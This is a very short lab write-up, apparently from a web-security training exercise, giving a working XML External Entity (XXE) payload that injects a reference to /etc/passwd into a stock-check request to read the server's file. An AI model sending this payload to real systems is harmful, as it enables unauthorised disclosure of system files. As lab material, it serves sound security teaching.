# Lab 01: Exploiting XXE to retrieve files

### 🎯 Goal
Retrieve `/etc/passwd`.

### 🛠️ Payload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
